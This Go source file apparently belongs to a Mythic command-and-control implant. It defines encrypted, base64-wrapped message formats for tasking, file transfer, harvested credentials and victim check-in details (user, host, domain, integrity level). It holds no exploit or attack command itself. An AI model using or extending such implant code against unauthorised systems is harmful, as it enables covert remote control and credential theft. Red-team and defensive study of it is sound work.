package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
)

type MythicMessage struct {
	Action   string          `json:"action"`
	UUID     string          `json:"uuid"`
	Tasking  json.RawMessage `json:"tasking,omitempty"`
	Tasks    []MythicTask    `json:"tasks,omitempty"`
	Staging  json.RawMessage `json:"staging,omitempty"`
	Tag      string          `json:"tag,omitempty"`
}

type MythicTask struct {
	Command string          `json:"command"`
	UUID    string          `json:"uuid"`
	Params  json.RawMessage `json:"params"`
}

type MythicResponse struct {
	Action       string            `json:"action"`
	UUID         string            `json:"uuid"`
	TaskUUID     string            `json:"task_uuid,omitempty"`
	UserOutput   string            `json:"user_output,omitempty"`
	Completed    bool              `json:"completed"`
	Status       string            `json:"status"`
	TotalChunks  int               `json:"total_chunks,omitempty"`
	ChunkNum     int               `json:"chunk_num,omitempty"`
	ChunkData    string            `json:"chunk_data,omitempty"`
	FullPath     string            `json:"full_path,omitempty"`
	FileID       string            `json:"file_id,omitempty"`
	Delegate     json.RawMessage   `json:"delegates,omitempty"`
	Credentials  []json.RawMessage `json:"credentials,omitempty"`
}

type Envelope struct {
	Message   string `json:"message"`
	UUID      string `json:"uuid"`
	Ciphertext string `json:"ciphertext,omitempty"`
}

type CheckinInfo struct {
	Action       string `json:"action"`
	UUID         string `json:"uuid"`
	OS           string `json:"os"`
	User         string `json:"user"`
	Host         string `json:"host"`
	PID          int    `json:"pid"`
	IP           string `json:"ip"`
	Architecture string `json:"architecture"`
	Domain       string `json:"domain"`
	Integrity    int    `json:"integrity_level"`
	EncryptionKey string `json:"encryption_key"`
	DecryptionKey string `json:"decryption_key"`
}

func (a *Agent) EncodeMessage(action string, data interface{}) ([]byte, error) {
	payload, err := json.Marshal(data)
	if err != nil {
		return nil, err
	}

	encrypted, err := a.crypt.Encrypt(payload)
	if err != nil {
		return nil, err
	}

	env := Envelope{
		Message: base64.StdEncoding.EncodeToString(encrypted),
		UUID:    a.UUID,
	}

	return json.Marshal(env)
}

func (a *Agent) DecodeMessage(raw []byte) (*MythicMessage, error) {
	var env Envelope
	if err := json.Unmarshal(raw, &env); err != nil {
		return nil, fmt.Errorf("envelope parse: %w", err)
	}

	if env.Ciphertext != "" {
		data, err := base64.StdEncoding.DecodeString(env.Ciphertext)
		if err != nil {
			return nil, fmt.Errorf("ciphertext decode: %w", err)
		}
		dec, err := a.crypt.Decrypt([]byte(data))
		if err != nil {
			return nil, fmt.Errorf("decrypt: %w", err)
		}
		var msg MythicMessage
		if err := json.Unmarshal(dec, &msg); err != nil {
			return nil, fmt.Errorf("message parse: %w", err)
		}
		return &msg, nil
	}

	if env.Message != "" {
		raw, err := base64.StdEncoding.DecodeString(env.Message)
		if err != nil {
			return nil, fmt.Errorf("message decode: %w", err)
		}
		dec, err := a.crypt.Decrypt(raw)
		if err != nil {
			return nil, fmt.Errorf("decrypt: %w", err)
		}
		var msg MythicMessage
		if err := json.Unmarshal(dec, &msg); err != nil {
			return nil, fmt.Errorf("message parse: %w", err)
		}
		return &msg, nil
	}

	var msg MythicMessage
	if err := json.Unmarshal(raw, &msg); err != nil {
		return nil, fmt.Errorf("raw message parse: %w", err)
	}
	return &msg, nil
}
